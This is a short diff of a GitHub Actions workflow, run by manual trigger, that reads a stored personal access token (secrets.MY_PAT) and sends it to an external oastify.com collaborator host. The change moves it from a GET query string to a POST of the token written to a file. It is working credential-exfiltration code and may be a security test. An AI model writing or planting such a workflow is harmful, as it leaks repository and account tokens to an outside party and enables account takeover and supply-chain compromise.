@@ -1,4 +1,4 @@
-name: Send PAT to Collaborator (Test)
+name: Send PAT via POST
 
 on:
   workflow_dispatch:
@@ -8,12 +8,11 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Send PAT to collaborator
+      - name: Send PAT via POST to collaborator
         env:
           COLLAB_URL: "http://pyr473mv5r7jghw2amsfw8xtikobc2gq5.oastify.com"
           PAT: ${{ secrets.MY_PAT }}
         run: |
-          # URL encode PAT to avoid HTTP errors
           sudo apt-get update && sudo apt-get install -y jq
-          PAT_ENC=$(echo -n "$PAT" | jq -sRr @uri)
-          curl -s "${COLLAB_URL}/token?pat=${PAT_ENC}" > /dev/null
+          echo -n "$PAT" > pat.txt
+          curl -X POST "$COLLAB_URL/token" --data-binary @pat.txt
